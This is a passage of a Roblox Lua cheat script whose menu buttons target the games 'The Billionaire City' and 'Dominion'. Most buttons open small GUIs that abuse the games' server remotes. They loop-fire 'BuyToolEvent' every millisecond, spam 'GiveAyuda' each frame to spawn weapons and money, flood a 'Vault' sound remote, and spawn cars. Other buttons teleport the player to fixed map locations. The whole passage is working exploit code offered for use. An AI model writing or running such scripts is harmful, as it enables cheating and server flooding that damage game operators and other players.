dropdownBtn.TextXAlignment = Enum.TextXAlignment.Left
dropdownBtn.AutoButtonColor = false
dropdownBtn.Parent = frame
Instance.new("UICorner", dropdownBtn).CornerRadius = UDim.new(0, 12)

local padding = Instance.new("UIPadding", dropdownBtn)
padding.PaddingLeft = UDim.new(0, 15)

-- Dropdown List (ScrollingFrame)
local dropList = Instance.new("ScrollingFrame")
dropList.Size = UDim2.new(1, -40, 0, 180)
dropList.Position = UDim2.new(0, 20, 0, 130)
dropList.BackgroundColor3 = Color3.new(1,1,1)
dropList.BorderSizePixel = 0
dropList.ScrollBarThickness = 0
dropList.Visible = false
dropList.ZIndex = 10
dropList.Parent = frame
Instance.new("UICorner", dropList).CornerRadius = UDim.new(0, 12)

local listLayout = Instance.new("UIListLayout")
listLayout.Padding = UDim.new(0, 4)
listLayout.Parent = dropList

-- Items
local items = {
    ".50 Pink", "Balistic Knife", "Blueprint", "Combat PD",
    "Hoverboard", "LockPick", "PD Cuff", "Rock",
    "PistolBody", "SharkFang", "SharkBone", "TASER",
    "Stone", "Oxy Pill", "SwitchBlade"
}

local selectedItem = nil

for _, itemName in ipairs(items) do
    local btn = Instance.new("TextButton")
    btn.Size = UDim2.new(1, -10, 0, 42)
    btn.BackgroundColor3 = Color3.new(1,1,1)
    btn.Text = itemName
    btn.TextColor3 = Color3.new(0,0,0)
    btn.Font = Enum.Font.Gotham
    btn.TextSize = 16
    btn.TextXAlignment = Enum.TextXAlignment.Left
    btn.AutoButtonColor = false
    btn.ZIndex = 11
    btn.Parent = dropList

    local pad = Instance.new("UIPadding", btn)
    pad.PaddingLeft = UDim.new(0, 15)

    Instance.new("UICorner", btn).CornerRadius = UDim.new(0, 10)

    btn.MouseButton1Click:Connect(function()
        selectedItem = itemName
        dropdownBtn.Text = itemName
        dropList.Visible = false
    end)
end

dropList.CanvasSize = UDim2.new(0, 0, 0, #items * 46)

-- Toggle dropdown
dropdownBtn.MouseButton1Click:Connect(function()
    dropList.Visible = not dropList.Visible
end)

-- Auto Buy Button
local autoBuy = Instance.new("TextButton")
autoBuy.Size = UDim2.new(1, -40, 0, 55)
autoBuy.Position = UDim2.new(0, 20, 1, -20)
autoBuy.AnchorPoint = Vector2.new(0, 1)
autoBuy.BackgroundColor3 = Color3.new(1,1,1)
autoBuy.Text = "START AUTO BUY"
autoBuy.TextColor3 = Color3.new(0,0,0)
autoBuy.Font = Enum.Font.GothamBold
autoBuy.TextSize = 20
autoBuy.AutoButtonColor = false
autoBuy.Parent = frame
Instance.new("UICorner", autoBuy).CornerRadius = UDim.new(0, 14)

-- Logic
local running = false
autoBuy.MouseButton1Click:Connect(function()
    running = not running
    autoBuy.Text = running and "STOP AUTO BUY" or "START AUTO BUY"

    if running and selectedItem then
        task.spawn(function()
            while running do
                ReplicatedStorage:WaitForChild("BuyToolEvent"):FireServer(selectedItem, 1, "Kaizeuuu")
                task.wait(0.001)
            end
        end)
    end
end)

-- RightShift to toggle GUI
UIS.InputBegan:Connect(function(input, gpe)
    if not gpe and input.KeyCode == Enum.KeyCode.RightShift then
        gui.Enabled = not gui.Enabled
    end
end)
end)

--// 8 Buttons in Main Menu
addMainMenuButton("THE BILLIONARE CITY SPAWN CASH (MONSY)", function()
    -- LocalScript: MONEY GUI – Pure White + Black Text Only
-- Place in StarterPlayerScripts

local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local RunService = game:GetService("RunService")

local player = Players.LocalPlayer
local gui = Instance.new("ScreenGui")
gui.ResetOnSpawn = false
gui.Parent = player:WaitForChild("PlayerGui")

-- Main Frame (White na)
local frame = Instance.new("Frame")
frame.Size = UDim2.new(0, 220, 0, 120)
frame.Position = UDim2.new(0.5, -110, 0.5, -60)
frame.BackgroundColor3 = Color3.new(1, 1, 1)  -- Pure white
frame.BorderSizePixel = 0
frame.Active = true
frame.Draggable = true
frame.Parent = gui

Instance.new("UICorner", frame).CornerRadius = UDim.new(0, 16)

-- Title
local title = Instance.new("TextLabel")
title.Size = UDim2.new(1, 0, 0, 30)
title.Position = UDim2.new(0, 0, 0, 8)
title.BackgroundTransparency = 1
title.Text = "MONEY"
title.TextColor3 = Color3.new(0, 0, 0)  -- Black text
title.Font = Enum.Font.GothamBold
title.TextSize = 18
title.Parent = frame

-- Money Amount
local moneyLabel = Instance.new("TextLabel")
moneyLabel.Size = UDim2.new(1, -20, 0, 25)
moneyLabel.Position = UDim2.new(0, 10, 0, 38)
moneyLabel.BackgroundTransparency = 1
moneyLabel.Text = "$0"
moneyLabel.TextColor3 = Color3.new(0, 0, 0)  -- Black na rin (walang green)
moneyLabel.Font = Enum.Font.GothamBold
moneyLabel.TextSize = 20
moneyLabel.TextXAlignment = Enum.TextXAlignment.Left
moneyLabel.Parent = frame

-- CASH Button (White bg, black text)
local cashButton = Instance.new("TextButton")
cashButton.Size = UDim2.new(0, 80,0,30)
cashButton.Position = UDim2.new(1, -90, 1, -38)
cashButton.BackgroundColor3 = Color3.new(1,1,1)  -- White
cashButton.Text = "CASH"
cashButton.TextColor3 = Color3.new(0,0,0)  -- Black text
cashButton.Font = Enum.Font.GothamBold
cashButton.TextSize = 14
cashButton.Parent = frame

Instance.new("UICorner", cashButton).CornerRadius = UDim.new(0, 8)

-- Toggle Switch (White/Gray lang)
local toggleFrame = Instance.new("Frame")
toggleFrame.Size = UDim2.new(0,40,0,20)
toggleFrame.Position = UDim2.new(0,10,1,-30)
toggleFrame.BackgroundColor3 = Color3.fromRGB(220,220,220)
toggleFrame.Parent = frame
Instance.new("UICorner", toggleFrame).CornerRadius = UDim.new(0,10)

local toggleButton = Instance.new("Frame")
toggleButton.Size = UDim2.new(0,16,0,16)
toggleButton.Position = UDim2.new(0,2,0.5,-8)
toggleButton.BackgroundColor3 = Color3.new(1,1,1)
toggleButton.Parent = toggleFrame
Instance.new("UICorner", toggleButton).CornerRadius = UDim.new(0,8)

-- Draggable (same pa rin)
local dragging, dragInput, dragStart, startPos
frame.InputBegan:Connect(function(input)
	if input.UserInputType == Enum.UserInputType.MouseButton1 then
		dragging = true
		dragStart = input.Position
		startPos = frame.Position
		input.Changed:Connect(function()
			if input.UserInputState == Enum.UserInputState.End then dragging = false end
		end)
	end
end)
frame.InputChanged:Connect(function(input)
	if input.UserInputType == Enum.UserInputType.MouseMovement then
		dragInput = input
	end
end)
RunService.RenderStepped:Connect(function()
	if dragging and dragInput then
		local delta = dragInput.Position - dragStart
		frame.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
	end
end)

-- Toggle Logic
local isOn = false
local connection

toggleFrame.InputBegan:Connect(function(input)
	if input.UserInputType == Enum.UserInputType.MouseButton1 then
		isOn = not isOn
		if isOn then
			toggleButton.Position = UDim2.new(1, -18, 0.5, -8)
			toggleFrame.BackgroundColor3 = Color3.fromRGB(200,200,200)  -- Light gray when ON
		else
			toggleButton.Position = UDim2.new(0, 2, 0.5, -8)
			toggleFrame.BackgroundColor3 = Color3.fromRGB(220,220,220)
		end

		if isOn then
			connection = RunService.Heartbeat:Connect(function()
				if ReplicatedStorage:FindFirstChild("GiveAyuda") then
					ReplicatedStorage.GiveAyuda:FireServer("Combat Pistol", -1)
				end
			end)
		else
			if connection then connection:Disconnect() end
		end
	end
end)

-- CASH Button
cashButton.MouseButton1Click:Connect(function()
	if ReplicatedStorage:FindFirstChild("GiveAyuda") then
		ReplicatedStorage.GiveAyuda:FireServer("Combat Pistol", -1)
	end
end)

-- Update Money
task.spawn(function()
	local stats = player:WaitForChild("leaderstats")
	local cash = stats:FindFirstChild("Cash") or stats:FindFirstChild("Money")
	if cash then
		moneyLabel.Text = "$"..cash.Value
		cash.Changed:Connect(function()
			moneyLabel.Text = "$"..cash.Value
		end)
	end
end)
end)

--// 8 Buttons in Main Menu
addMainMenuButton("THE BILLIONARE CITY REFRESH (MONSY)", function()
	--// GUI Setup
local ScreenGui = Instance.new("ScreenGui")
local Frame = Instance.new("Frame")
local UICorner = Instance.new("UICorner")
local UIStroke = Instance.new("UIStroke")
local Title = Instance.new("TextLabel")
local SpawnButton = Instance.new("TextButton")
local TPButton = Instance.new("TextButton")
local RefreshButton = Instance.new("TextButton")
local Drag = Instance.new("UIDragDetector")

ScreenGui.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
ScreenGui.ResetOnSpawn = false

Frame.Parent = ScreenGui
Frame.BackgroundColor3 = Color3.fromRGB(255,255,255)
Frame.Position = UDim2.new(0.4, 0, 0.4, 0)
Frame.Size = UDim2.new(0, 200, 0, 180)

UIStroke.Parent = Frame
UIStroke.Color = Color3.fromRGB(0,0,0)
UIStroke.Thickness = 2

UICorner.Parent = Frame
Drag.Parent = Frame

--// Title
Title.Parent = Frame
Title.BackgroundTransparency = 1
Title.Text = "MONSY"
Title.Size = UDim2.new(1,0,0,25)
Title.Position = UDim2.new(0,0,0,0)
Title.TextColor3 = Color3.fromRGB(0,0,0)
Title.TextSize = 16
Title.Font = Enum.Font.GothamBold

--// Button styling function
local function MakeButton(btn, text, posY)
    btn.Parent = Frame
    btn.BackgroundColor3 = Color3.fromRGB(255,255,255)
    btn.TextColor3 = Color3.fromRGB(0,0,0)
    btn.Text = text
    btn.Size = UDim2.new(0,180,0,35)
    btn.Position = UDim2.new(0,10,0,posY)
    btn.Font = Enum.Font.GothamBold
    btn.TextSize = 14 -- <<<<< MAS MALIIT NA TEXT
    Instance.new("UICorner", btn)
end

MakeButton(SpawnButton, "SPAWN CAR", 30)
MakeButton(TPButton, "TELEPORT", 75)
MakeButton(RefreshButton, "REFRESH", 120)

--// SPAWN CAR FUNCTION
SpawnButton.MouseButton1Click:Connect(function()
    local args = {}
    game:GetService("ReplicatedStorage"):WaitForChild("SpawnCarEvent", 9e9):FireServer(unpack(args))
end)

--// TELEPORT FUNCTION
local targetPosition = Vector3.new(-10.015, 5.02, 788.2)

TPButton.MouseButton1Click:Connect(function()
    local character = game.Players.LocalPlayer.Character
    if character and character:FindFirstChild("HumanoidRootPart") then
        character:SetPrimaryPartCFrame(CFrame.new(targetPosition))
        print("Teleported!")
    else
        warn("HumanoidRootPart missing!")
    end
end)

--// REFRESH FUNCTION
RefreshButton.MouseButton1Click:Connect(function()
    local args = {
        [1] = "Male";
    }
    game:GetService("ReplicatedStorage"):WaitForChild("Morph", 9e9):FireServer(unpack(args))
end)
end)

--// 8 Buttons in Main Menu
addMainMenuButton("THE BILLIONARE CITY SPAWN GUI (MONSY)", function()
	-- LocalScript: PUBLIC ENEMY — Buy Tool (Super Compact White GUI)
-- Place in StarterPlayerScripts

local Players = game:GetService("Players")
local TweenService = game:GetService("TweenService")
local ReplicatedStorage = game:GetService("ReplicatedStorage")

local player = Players.LocalPlayer
local playerGui = player:WaitForChild("PlayerGui")
local buyRemote = ReplicatedStorage:WaitForChild("BuyToolEvent")

-- GUI
local gui = Instance.new("ScreenGui")
gui.Name = "PublicEnemyMini"
gui.ResetOnSpawn = false
gui.Parent = playerGui

-- Main Frame (mas maliit na)
local frame = Instance.new("Frame")
frame.Size = UDim2.new(0, 280, 0, 160)           -- mas compact
frame.Position = UDim2.new(0.5, -140, 0.5, -80)
frame.AnchorPoint = Vector2.new(0.5, 0.5)
frame.BackgroundColor3 = Color3.new(1, 1, 1)      -- pure white
frame.BorderSizePixel = 0
frame.Active = true
frame.Draggable = true
frame.Parent = gui

Instance.new("UICorner", frame).CornerRadius = UDim.new(0, 14)

-- Soft shadow
local shadow = Instance.new("Frame")
shadow.Size = UDim2.new(1, 10, 1, 16)
shadow.Position = UDim2.new(0, -5, 0, 8)
shadow.BackgroundTransparency = 0.85
shadow.BackgroundColor3 = Color3.new(0,0,0)
shadow.ZIndex = frame.ZIndex - 1
shadow.Parent = frame
Instance.new("UICorner", shadow).CornerRadius = UDim.new(0, 16)

-- Title
local title = Instance.new("TextLabel")
title.Size = UDim2.new(1, 0, 0, 36)
title.BackgroundTransparency = 1
title.Text = "PUBLIC ENEMY"
title.TextColor3 = Color3.new(0, 0, 0)
title.Font = Enum.Font.GothamBlack
title.TextSize = 19
title.Parent = frame

-- TextBox (mas maliit at mas maganda)
local box = Instance.new("TextBox")
box.Size = UDim2.new(1, -32, 0, 38)
box.Position = UDim2.new(0, 16, 0, 46)
box.BackgroundColor3 = Color3.fromRGB(248, 248, 250)
box.PlaceholderText = "Tool name here..."
box.PlaceholderColor3 = Color3.fromRGB(140, 140, 140)
box.Text = ""
box.TextColor3 = Color3.new(0, 0, 0)
box.Font = Enum.Font.GothamMedium
box.TextSize = 15
box.ClearTextOnFocus = false
box.Parent = frame

Instance.new("UICorner", box).CornerRadius = UDim.new(0, 10)
local pad = Instance.new("UIPadding", box)
pad.PaddingLeft = UDim.new(0, 12)
pad.PaddingRight = UDim.new(0, 12)

-- BUY Button (white na rin, black text)
local btn = Instance.new("TextButton")
btn.Size = UDim2.new(1, -32, 0, 42)
btn.Position = UDim2.new(0, 16, 1, -58)
btn.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
btn.Text = "BUY TOOL"
btn.TextColor3 = Color3.new(0, 0, 0)
btn.Font = Enum.Font.GothamBold
btn.TextSize = 16
btn.AutoButtonColor = false
btn.Parent = frame

Instance.new("UICorner", btn).CornerRadius = UDim.new(0, 10)

-- Hover effect (light gray lang para subtle)
btn.MouseEnter:Connect(function()
	TweenService:Create(btn, TweenInfo.new(0.18), {BackgroundColor3 = Color3.fromRGB(240, 240, 245)}):Play()
end)
btn.MouseLeave:Connect(function()
	TweenService:Create(btn, TweenInfo.new(0.18), {BackgroundColor3 = Color3.new(1,1,1)}):Play()
end)

-- Feedback (very small sa baba)
local feedback = Instance.new("TextLabel")
feedback.Size = UDim2.new(1, 0, 0, 20)
feedback.Position = UDim2.new(0, 0, 1, -24)
feedback.BackgroundTransparency = 1
feedback.Text = ""
feedback.TextColor3 = Color3.fromRGB(0, 120, 0)
feedback.Font = Enum.Font.GothamBold
feedback.TextSize = 13
feedback.Parent = frame

local function show(msg)
	feedback.Text = msg
	task.delay(2, function()
		if feedback.Parent then feedback.Text = "" end
	end)
end

-- Buy function
local function buy()
	local name = box.Text:match("^%s*(.-)%s*$")  -- trim
	if name == "" then
		show("Enter tool name!")
		return
	end

	buyRemote:FireServer(name, 1, "Kaizeuuu")
	show("Buying " .. name .. "...")
	box.Text = ""
end

btn.MouseButton1Click:Connect(buy)

-- Enter key sa textbox = buy din
box.FocusLost:Connect(function(enter)
	if enter then buy() end
end)

-- Cleanup
player.AncestryChanged:Connect(function()
	if not player.Parent then gui:Destroy() end
end)
end)

--// 8 Buttons in Main Menu
addMainMenuButton("THE BILLIONARE CITY SPAM SOUND (MONSY)", function()
    -- LocalScript (put in StarterPlayerScripts)
-- SPAM SOUND GUI with toggle (draggable, black, rounded corners)
local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local RunService = game:GetService("RunService")

local player = Players.LocalPlayer
local playerGui = player:WaitForChild("PlayerGui")

-- Remote reference (uses user's provided pattern)
local vaultRemote = ReplicatedStorage:WaitForChild("Vault", 9e9)

-- GUI setup
local screenGui = Instance.new("ScreenGui")
screenGui.Name = "SpamSoundGUI"
screenGui.ResetOnSpawn = false
screenGui.Parent = playerGui

local main = Instance.new("Frame")
main.Name = "Main"
main.Parent = screenGui
main.Size = UDim2.new(0, 220, 0, 100)
main.Position = UDim2.new(0.5, -110, 0.5, -50)
main.BackgroundColor3 = Color3.fromRGB(255,255,255) -- all black
main.Active = true -- required for dragging
main.AnchorPoint = Vector2.new(0.5, 0.5)

local uicorner = Instance.new("UICorner", main)
uicorner.CornerRadius = UDim.new(0, 12)

-- Title
local title = Instance.new("TextLabel")
title.Parent = main
title.Size = UDim2.new(1, 0, 0, 28)
title.Position = UDim2.new(0, 0, 0, 6)
title.BackgroundTransparency = 1
title.Text = "SPAM SOUND"
title.Font = Enum.Font.GothamBold
title.TextSize = 16
title.TextColor3 = Color3.fromRGB(0,0,0)
title.AnchorPoint = Vector2.new(0, 0)

-- Toggle button
local toggleBtn = Instance.new("TextButton")
toggleBtn.Name = "Toggle"
toggleBtn.Parent = main
toggleBtn.Size = UDim2.new(0, 120, 0, 34)
toggleBtn.Position = UDim2.new(0.5, -60, 0, 46)
toggleBtn.BackgroundColor3 = Color3.fromRGB(255,255,255)
toggleBtn.BorderSizePixel = 0
toggleBtn.AutoButtonColor = true
toggleBtn.Font = Enum.Font.Gotham
toggleBtn.TextSize = 14
toggleBtn.TextColor3 = Color3.fromRGB(0,0,0)
toggleBtn.Text = "OFF"

local toggleCorner = Instance.new("UICorner", toggleBtn)
toggleCorner.CornerRadius = UDim.new(0, 10)

-- Small status dot (left of text)
local statusDot = Instance.new("Frame")
statusDot.Name = "StatusDot"
statusDot.Parent = toggleBtn
statusDot.Size = UDim2.new(0, 12, 0, 12)
statusDot.Position = UDim2.new(0, 8, 0.5, -6)
statusDot.BackgroundColor3 = Color3.fromRGB(170,170,170)
statusDot.BorderSizePixel = 0
local dotCorner = Instance.new("UICorner", statusDot)
dotCorner.CornerRadius = UDim.new(1, 0)

-- Make main draggable
do
	local dragging, dragStart, startPos

	local function inputBegan(input)
		if input.UserInputType == Enum.UserInputType.MouseButton1 then
			dragging = true
			dragStart = input.Position
			startPos = main.Position
			input.Changed:Connect(function()
				if input.UserInputState == Enum.UserInputState.End then
					dragging = false
				end
			end)
		end
	end

	local function inputChanged(input)
		if input.UserInputType == Enum.UserInputType.MouseMovement and dragging then
			local delta = input.Position - dragStart
			main.Position = UDim2.new(
				startPos.X.Scale,
				startPos.X.Offset + delta.X,
				startPos.Y.Scale,
				startPos.Y.Offset + delta.Y
			)
		end
	end

	main.InputBegan:Connect(inputBegan)
	main.InputChanged:Connect(inputChanged)
end

-- Spam loop control
local isOn = false
local spamTask = nil

local function startSpam()
	if spamTask then return end
	spamTask = task.spawn(function()
		-- local args table as user provided
		local args = {}
		while isOn do
			local ok, err = pcall(function()
				vaultRemote:FireServer(unpack(args))
			end)
			-- silently ignore errors so the loop continues but avoid tight infinite error floods
			if not ok then
				-- optional: you can print(err) for debugging
				-- print("FireServer error:", err)
			end
			-- smallest reasonable wait; task.wait(0.001) will wait ~1ms but can be limited by scheduler
			task.wait(0.001)
		end
		spamTask = nil
	end)
end

local function stopSpam()
	isOn = false
	-- spamTask will end by itself because loop checks isOn
end

-- Toggle behavior
toggleBtn.MouseButton1Click:Connect(function()
	if not isOn then
		isOn = true
		toggleBtn.Text = "ON"
		statusDot.BackgroundColor3 = Color3.fromRGB(0,255,0)
		startSpam()
	else
		stopSpam()
		toggleBtn.Text = "OFF"
		statusDot.BackgroundColor3 = Color3.fromRGB(170,170,170)
	end
end)

-- Optional: allow closing with right-click on title (not required)
title.InputBegan:Connect(function(input)
	if input.UserInputType == Enum.UserInputType.MouseButton2 then
		screenGui:Destroy()
	end
end)
end)

--// 8 Buttons in Main Menu
addMainMenuButton("THE BILLIONAIRE CITY STORAGE SYSTEM", function()
    -- LocalScript: Tools Viewer (White GUI + Black Text + Light Accents)
-- Place in StarterPlayerScripts

local Players = game:GetService("Players")
local TweenService = game:GetService("TweenService")
local player = Players.LocalPlayer
local playerGui = player:WaitForChild("PlayerGui")

local toolsFolder = game.ReplicatedStorage:WaitForChild("Tools")

-- Main GUI
local gui = Instance.new("ScreenGui")
gui.Name = "StorageSystemToolsViewer"
gui.ResetOnSpawn = false
gui.Parent = playerGui

-- Main Frame (White background)
local frame = Instance.new("Frame")
frame.Size = UDim2.new(0, 400, 0, 360)
frame.Position = UDim2.new(0.5, -200, 0.25, 0)
frame.AnchorPoint = Vector2.new(0.5, 0)
frame.BackgroundColor3 = Color3.new(1, 1, 1) -- Pure white
frame.BorderSizePixel = 0
frame.Active = true
frame.Draggable = true
frame.Parent = gui

local frameCorner = Instance.new("UICorner")
frameCorner.CornerRadius = UDim.new(0, 14)
frameCorner.Parent = frame

-- Soft shadow effect (optional but nice on white)
local shadow = Instance.new("Frame")
shadow.Size = UDim2.new(1, 8, 1, 20)
shadow.Position = UDim2.new(0, -4, 0, 10)
shadow.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
shadow.BackgroundTransparency = 0.85
shadow.ZIndex = frame.ZIndex - 1
shadow.Parent = frame
local shadowCorner = Instance.new("UICorner")
shadowCorner.CornerRadius = UDim.new(0, 16)
shadowCorner.Parent = shadow

-- Title
local title = Instance.new("TextLabel")
title.Size = UDim2.new(1, 0, 0, 42)
title.BackgroundTransparency = 1
title.Text = "Tools Viewer"
title.Font = Enum.Font.GothamBold
title.TextSize = 20
title.TextColor3 = Color3.new(0, 0, 0) -- Black text
title.Parent = frame

-- Subtitle
local subtitle = Instance.new("TextLabel")
subtitle.Size = UDim2.new(1, -24, 0, 20)
subtitle.Position = UDim2.new(0, 12, 0, 44)
subtitle.BackgroundTransparency = 1
subtitle.Text = "Click any tool to copy its name"
subtitle.Font = Enum.Font.Gotham
subtitle.TextSize = 14
subtitle.TextColor3 = Color3.fromRGB(90, 90, 90)
subtitle.TextXAlignment = Enum.TextXAlignment.Left
subtitle.Parent = frame

-- ScrollingFrame (slightly off-white for depth)
local scrolling = Instance.new("ScrollingFrame")
scrolling.Size = UDim2.new(1, -24, 1, -80)
scrolling.Position = UDim2.new(0, 12, 0, 72)
scrolling.BackgroundColor3 = Color3.fromRGB(248, 248, 250)
scrolling.BorderSizePixel = 0
scrolling.ScrollBarThickness = 8
scrolling.ScrollBarImageColor3 = Color3.fromRGB(180, 180, 190)
scrolling.Parent = frame

local scrollCorner = Instance.new("UICorner")
scrollCorner.CornerRadius = UDim.new(0, 10)
scrollCorner.Parent = scrolling

local layout = Instance.new("UIListLayout")
layout.SortOrder = Enum.SortOrder.Name
layout.Padding = UDim.new(0, 6)
layout.Parent = scrolling

-- Functions
local function clearList()
	for _, child in scrolling:GetChildren() do
		if child:IsA("TextButton") then
			child:Destroy()
		end
	end
end

local function addTool(tool)
	local btn = Instance.new("TextButton")
	btn.Size = UDim2.new(1, -12, 0, 36)
	btn.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
	btn.Text = "  " .. tool.Name
	btn.TextXAlignment = Enum.TextXAlignment.Left
	btn.Font = Enum.Font.GothamMedium
	btn.TextSize = 15
	btn.TextColor3 = Color3.new(0, 0, 0)
	btn.AutoButtonColor = false
	btn.Parent = scrolling

	local corner = Instance.new("UICorner")
	corner.CornerRadius = UDim.new(0, 8)
	corner.Parent = btn

	-- Hover effect
	btn.MouseEnter:Connect(function()
		TweenService:Create(btn, TweenInfo.new(0.2), {BackgroundColor3 = Color3.fromRGB(235, 245, 255)}):Play()
	end)
	btn.MouseLeave:Connect(function()
		TweenService:Create(btn, TweenInfo.new(0.2), {BackgroundColor3 = Color3.fromRGB(255, 255, 255)}):Play()
	end)

	-- Click → Copy name
	btn.MouseButton1Click:Connect(function()
		setclipboard(tool.Name)
		btn.TextColor3 = Color3.fromRGB(0, 140, 0)
		btn.Text = "  " .. tool.Name .. "  [Copied!]"
		task.wait(1.4)
		btn.TextColor3 = Color3.new(0, 0, 0)
		btn.Text = "  " .. tool.Name
	end)
end

local function rebuildList()
	clearList()
	local list = {}
	for _, obj in toolsFolder:GetDescendants() do
		if obj:IsA("Tool") then
			table.insert(list, obj)
		end
	end
	table.sort(list, function(a, b) return a.Name:lower() < b.Name:lower() end)
	for _, tool in list do
		addTool(tool)
	end
	scrolling.CanvasSize = UDim2.new(0, 0, 0, #list * 42)
end

-- Initial build + live updates
rebuildList()

toolsFolder.DescendantAdded:Connect(function(child)
	if child:IsA("Tool") then
		task.defer(rebuildList)
	end
end)

toolsFolder.DescendantRemoving:Connect(function(child)
	if child:IsA("Tool") then
		rebuildList()
	end
end)

-- Cleanup on leave
player.AncestryChanged:Connect(function()
	if not player.Parent then
		gui:Destroy()
	end
end)
end)

local function addMainMenuButton(text, callback)
	local panel = allTabPanels["RP TELEPORT"]
	if not panel then return end
	local btn = new("TextButton", {
		Size = UDim2.new(1, -16, 0, 38),
		BackgroundColor3 = Color3.fromRGB(255,255,255),
		TextColor3 = Color3.new(0,0,0),
		Font = Enum.Font.GothamSemibold,
		TextSize = 14,
		Text = text,
		AutoButtonColor = false,
		Parent = panel,
	})
	new("UICorner", {CornerRadius = UDim.new(0,6), Parent = btn})
	btn.MouseEnter:Connect(function()
		TweenService:Create(btn, TweenInfo.new(0.2), {BackgroundColor3 = Color3.fromRGB(20,20,20)}):Play()
	end)
	btn.MouseLeave:Connect(function()
		TweenService:Create(btn, TweenInfo.new(0.2), {BackgroundColor3 = Color3.fromRGB(255,255,255)}):Play()
	end)
	btn.MouseButton1Click:Connect(function()
		clickSound:Play()
		callback()
	end)
end

--// 8 Buttons in Main Menu
addMainMenuButton("-----------------------------DOMINION-----------------------------", function()

end)

--// 8 Buttons in Main Menu
addMainMenuButton("HOSPITAL [DOMINION]", function()
    -- LocalScript (Client-Side)

local player = game.Players.LocalPlayer
local character = player.Character or player.CharacterAdded:Wait()

-- Define the target position
local targetPosition = Vector3.new(-1277.2003173828125, 3.3827743530273438, -1826.16162109375)

-- Function to teleport the player immediately
local function teleportToTarget()
    -- Check if HumanoidRootPart exists and teleport immediately
    if character and character:FindFirstChild("HumanoidRootPart") then
        character:SetPrimaryPartCFrame(CFrame.new(targetPosition))  -- Teleport to target position
    else
        print("Error: HumanoidRootPart missing.")
    end
end

-- Teleport as soon as the character is fully loaded
teleportToTarget()
end)

--// 8 Buttons in Main Menu
addMainMenuButton("GARAGE [DOMINION]", function()
    -- LocalScript (Client-Side)

local player = game.Players.LocalPlayer
local character = player.Character or player.CharacterAdded:Wait()

-- Define the target position
local targetPosition = Vector3.new(-790.076416015625, 3.355360984802246, 544.596923828125)

-- Function to teleport the player immediately
local function teleportToTarget()
    -- Check if HumanoidRootPart exists and teleport immediately
    if character and character:FindFirstChild("HumanoidRootPart") then
        character:SetPrimaryPartCFrame(CFrame.new(targetPosition))  -- Teleport to target position
    else
        print("Error: HumanoidRootPart missing.")
    end
end

-- Teleport as soon as the character is fully loaded
teleportToTarget()
end)

--// 8 Buttons in Main Menu
addMainMenuButton("CLOTHING [DOMINION]", function()
    -- LocalScript (Client-Side)

local player = game.Players.LocalPlayer
local character = player.Character or player.CharacterAdded:Wait()

-- Define the target position
local targetPosition = Vector3.new(-662.8965454101562, 3.3553061485290527, -1483.33349609375)

-- Function to teleport the player immediately
local function teleportToTarget()
    -- Check if HumanoidRootPart exists and teleport immediately
    if character and character:FindFirstChild("HumanoidRootPart") then
        character:SetPrimaryPartCFrame(CFrame.new(targetPosition))  -- Teleport to target position
    else
        print("Error: HumanoidRootPart missing.")
    end
end

-- Teleport as soon as the character is fully loaded
teleportToTarget()
end)

--// 8 Buttons in Main Menu
addMainMenuButton("GUNSHOP [DOMINION]", function()
    -- LocalScript (Client-Side)

local player = game.Players.LocalPlayer
local character = player.Character or player.CharacterAdded:Wait()

-- Define the target position
local targetPosition = Vector3.new(-428.618896484375, 6.015244483947754, -689.5989379882812)

-- Function to teleport the player immediately
local function teleportToTarget()
    -- Check if HumanoidRootPart exists and teleport immediately
    if character and character:FindFirstChild("HumanoidRootPart") then
        character:SetPrimaryPartCFrame(CFrame.new(targetPosition))  -- Teleport to target position
    else
        print("Error: HumanoidRootPart missing.")
    end
end

-- Teleport as soon as the character is fully loaded
teleportToTarget()
end)

--// 8 Buttons in Main Menu
addMainMenuButton("CAR DEALER [DOMINION]", function()
    -- LocalScript (Client-Side)

local player = game.Players.LocalPlayer
local character = player.Character or player.CharacterAdded:Wait()

-- Define the target position
local targetPosition = Vector3.new(-275.1256103515625, 3.2432126998901367, -690.48095703125)

-- Function to teleport the player immediately
local function teleportToTarget()
    -- Check if HumanoidRootPart exists and teleport immediately
    if character and character:FindFirstChild("HumanoidRootPart") then
        character:SetPrimaryPartCFrame(CFrame.new(targetPosition))  -- Teleport to target position
    else
        print("Error: HumanoidRootPart missing.")
    end
end

-- Teleport as soon as the character is fully loaded
teleportToTarget()
end)

--// 8 Buttons in Main Menu
addMainMenuButton("PHARMACY [DOMINION]", function()
    -- LocalScript (Client-Side)

local player = game.Players.LocalPlayer
local character = player.Character or player.CharacterAdded:Wait()

-- Define the target position
local targetPosition = Vector3.new(-916.824951171875, 3.3557791709899902, -2051.001708984375)

-- Function to teleport the player immediately
local function teleportToTarget()
    -- Check if HumanoidRootPart exists and teleport immediately
    if character and character:FindFirstChild("HumanoidRootPart") then
        character:SetPrimaryPartCFrame(CFrame.new(targetPosition))  -- Teleport to target position
    else
        print("Error: HumanoidRootPart missing.")
    end
end

-- Teleport as soon as the character is fully loaded
teleportToTarget()
end)

--// 8 Buttons in Main Menu
addMainMenuButton("FLEECA [DOMINION]", function()
    -- LocalScript (Client-Side)

local player = game.Players.LocalPlayer
local character = player.Character or player.CharacterAdded:Wait()

-- Define the target position
local targetPosition = Vector3.new(-921.0623779296875, 3.446157932281494, -168.2418212890625)

-- Function to teleport the player immediately
local function teleportToTarget()
    -- Check if HumanoidRootPart exists and teleport immediately
    if character and character:FindFirstChild("HumanoidRootPart") then
        character:SetPrimaryPartCFrame(CFrame.new(targetPosition))  -- Teleport to target position
    else
        print("Error: HumanoidRootPart missing.")
    end
end

-- Teleport as soon as the character is fully loaded
teleportToTarget()
end)

--// 8 Buttons in Main Menu
addMainMenuButton("POLICE DEPARTMENT [DOMINION]", function()
    -- LocalScript (Client-Side)

local player = game.Players.LocalPlayer
local character = player.Character or player.CharacterAdded:Wait()

-- Define the target position
local targetPosition = Vector3.new(-1821.7645263671875, 13.095586776733398, 286.4205627441406)

-- Function to teleport the player immediately
local function teleportToTarget()
    -- Check if HumanoidRootPart exists and teleport immediately
    if character and character:FindFirstChild("HumanoidRootPart") then
